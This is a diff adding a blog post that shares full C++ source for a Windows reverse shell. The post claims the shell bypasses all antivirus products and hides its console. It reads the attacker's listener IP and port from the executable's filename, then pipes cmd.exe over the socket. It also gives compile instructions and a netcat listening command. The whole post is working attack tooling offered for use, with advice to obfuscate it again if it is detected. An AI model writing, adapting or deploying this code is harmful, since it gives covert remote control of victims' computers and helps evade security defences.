@@ -14,4 +14,133 @@ Do Not Use tools or methods of this blog on any hardware or software without aut
 </Prompt>
 
 Today i share a c++ reverse shell source code for windows , as time of writing , its fully undetectable !
+Its bypassing all antivirus solutions and works with
+- Windows 11 
+- Windows 10 
+- Windows 8 
+- Windows 7 
+- Windows Server 2019 
+- Windows Server 2016 
 
+The source code is not obfuscated and if along the way get detected by av solutions , We can obfuscate it and its ready to go again !
+
+One of the cool methods of this reverse shell is the ip and port for your listiner , Its hardcoded on name of the .exe file !
+
+For Example your listiner ip and port is = 192.168.1.1:8080
+You rename the exe file to this :
+```
+192x168x1x1_8080.exe
+```
+
+# How Compile It
+
+#### First you copy the source code :
+```c++
+#include <winsock2.h>
+#include <stdio.h>
+#include <string>
+#include <tchar.h>
+#include <Windows.h>
+
+#pragma comment(lib,"ws2_32")
+#pragma warning(disable:4996) 
+WSADATA wsaData; SOCKET s1;
+struct sockaddr_in R;
+STARTUPINFO A;
+PROCESS_INFORMATION B;
+using std::string;
+string getFileName(const string& s) {
+
+	char sep = '/';
+	
+	#ifdef _WIN32
+		sep = '\\';
+	#endif
+	size_t i = s.rfind(sep, s.length());
+	if (i != string::npos) {
+		return(s.substr(i + 1, s.length() - i));
+	}
+
+	return("");
+}
+
+int main(int argc, char *argv[])
+{
+	FreeConsole(); //Hide window
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+	string path =getFileName(argv[0]);
+	path.resize(path.size() - 4); //remove .exe from the file
+	//replace x to "."
+	for (int i = 0; i < path.size(); i++) {
+		if (path[i] == 'x') {
+			path[i] = '.';
+		}
+	}
+	//PORT and IP from the executable
+	size_t i = path.rfind("_", path.length());
+	string port = path.substr(i+1, i-path.length());
+	string ip = path.substr(0, i);
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+	R.sin_family = AF_INET;
+	R.sin_port = htons(std::stoul(port, nullptr, 0));
+	R.sin_addr.s_addr = inet_addr(ip.c_str());
+	WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
+	memset(&A, 0, sizeof(A));
+	A.cb = sizeof(A);
+	A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;
+	TCHAR c[256] = L"cm";
+	TCHAR d[256] = L"d.exe";
+	CreateProcess(NULL, _tcscat(c, d), 0, 0, 1, 0, 0, 0, &A, &B);
+
+}
+```
+#### Second Save it with whatever name you want with .cpp extension 
+For Example I Save The Source Code With This Name :
+```bash
+mine.cpp
+```
+You can compile this in two ways :
+- Visual Studio
+- MSVC Compiler
+For compiling in visual studio you just have to make a new project and add the .cpp file to the project and compile for x64 .
+
+If you dont have visual studio , you can use Microsoft MSVC Compiler Tool
+<Resource
+  links={[
+    {
+      title: "MSVC Compiler Tool",
+      link: "https://docs.microsoft.com/en-us/cpp/build/reference/compiler-options?view=msvc-170",
+    },
+  ]}
+/>
+
+After Downloading MSVC Compiler Tool you just have to open new cmd or powershell prompt on the folder you saved .cpp file and run this command :
+```cmd
+cl.exe mine.cpp
+```
+Thats It ! After compiling you have a exe file named mine.exe .
+Rename the exe file with your listiner ip and port like this :
+```cmd
+192x168x1x1_8080.exe
+```
+Now you just have listen a port and run the exe file on the windows system . 
+
+# Listen a port on Windows
+
+For listen a port on windows and get the reverse connection , i suggest netcan for windows 
+
+<Resource
+  links={[
+    {
+      title: "Netcan For Windows",
+      link: "https://github.com/rahuldottech/netcat-for-windows/releases",
+    },
+  ]}
+/>
+
+After downloading netcat for windows listen a port with this command :
+```cmd
+nc64.exe -lvnp 8080
+```
+Thats it . 
